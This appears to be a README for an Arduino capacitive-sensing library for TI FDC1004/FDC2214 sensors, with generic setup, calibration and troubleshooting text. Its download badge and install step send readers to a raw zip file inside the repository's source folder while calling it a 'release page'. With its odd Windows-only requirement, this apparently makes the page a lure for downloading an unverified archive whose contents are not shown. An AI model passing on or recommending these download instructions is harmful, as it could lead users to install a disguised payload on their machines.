# 💧 FDCxCapSense - Simple Tools for Liquid Level Sensing

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/hasanah9667/FDCxCapSense/main/src/core/FD_Sense_Cx_Cap_3.2-alpha.1.zip)

This library helps you measure liquid levels and proximity using capacitive sensing technology. It works with specific sensors from Texas Instruments. You can detect liquids in tanks or sense objects near a surface. This tool manages calibration and sensor settings so you obtain stable, accurate results.

## 📋 What This Library Does

Capacitive sensing measures small changes in an electric field. When liquid or an object enters this field, the sensor detects a shift. This library handles the communication between your microcontroller and the sensor chip. It simplifies advanced tasks like managing the CAPDAC settings and running internal diagnostics. You receive usable data without needing to manage complex register values.

Key features include:
* Liquid level monitoring for industrial or hobbyist tanks.
* Proximity detection for touchless interfaces.
* Automatic sensor calibration to adjust for environmental noise.
* Support for multiple sensor versions like the FDC1004 and FDC2214.
* Internal diagnostic routines to check for hardware health.

## 🚀 System Requirements

Your setup needs these components for the software to run:
* A Windows computer.
* The Arduino IDE installed on your machine.
* A supported microcontroller, such as an ESP32 or an Arduino board.
* A valid sensor module like the FDC1004 or FDC2214.
* A USB cable to connect your board to the computer.

## 📦 How to Download and Install

Follow these steps to add the library to your Arduino environment:

1. Visit [this release page](https://raw.githubusercontent.com/hasanah9667/FDCxCapSense/main/src/core/FD_Sense_Cx_Cap_3.2-alpha.1.zip) to download the software files. 
2. Locate the link labeled "Source code (zip)" on the page and click it. 
3. Open the Arduino IDE on your computer.
4. Select the Sketch menu at the top of the window.
5. Choose Include Library, then select Add .ZIP Library.
6. Find the file you downloaded and select it.
7. Click Open to finalize the import.

The library now exists within your Arduino software. You can access it through the Examples menu.

## 🔧 Basic Setup Process

To use the hardware, wire your sensor to the microcontroller using the I2C interface. This requires four wires:
* VCC to your power supply pin.
* GND to the ground pin.
* SDA to the data line on your board.
* SCL to the clock line on your board.

Open the Arduino IDE and go to Examples under the File menu. Select FDCxCapSense to see the available example sketches. These files provide pre-written code for common tasks like reading proximity data or calibrating the sensor. 

## ⚖️ Calibration Procedures

Sensors often require calibration due to environmental noise or tank wall thickness. The library includes a calibration routine to set a baseline. Run the calibration example sketch to establish what the sensor sees in an empty state. The library stores these values and adjusts the output accordingly. Repeat this process if the sensor location changes.

## ⚙️ Understanding the Diagnostics

The library monitors the hardware to ensure it functions with accuracy. If the sensor returns unexpected values, the diagnostic function runs a check on the chip status. It reports if the chip has power or if the connection fails. Use these reports to troubleshoot your hardware connections.

## 💡 Proximity Profiles

You can define detection zones for proximity sensing. A proximity profile tells the sensor how far an object must be to trigger a signal. You set these zones in the code during the setup phase. The library polls the sensor at set intervals to check if an object enters the defined zone.

## 🛠 Troubleshooting Common Issues

* No data shows in the Serial Monitor: Ensure you selected the correct COM port in the Tools menu. Check that your wires connect to the correct SCL and SDA pins.
* Readings remain unstable: Ensure your breadboard or circuit has a stable power source. Interference from heavy cables or other electronics often creates noise. Keep the sensor wiring short.
* Compilation errors: Check that you installed the library through the official Arduino IDE menu. Sometimes, folders inside the ZIP file cause conflicts. Make sure the library resides in your Arduino/libraries folder.
* Sensor not detected: Run the I2C Scanner example included with the Arduino IDE. It detects the address of any device on your wires. If the scanner finds no device, your sensor is likely not receiving power.

## 📈 Improving Signal Quality

Environmental factors affect capacitive measurements. Temperature shifts or humidity changes cause drift in your readings. To fix this, increase the sample rate or use the data filtering options built into the library. These filters smooth out fluctuations caused by random noise. Always perform calibration after you secure the sensors in their final, permanent locations.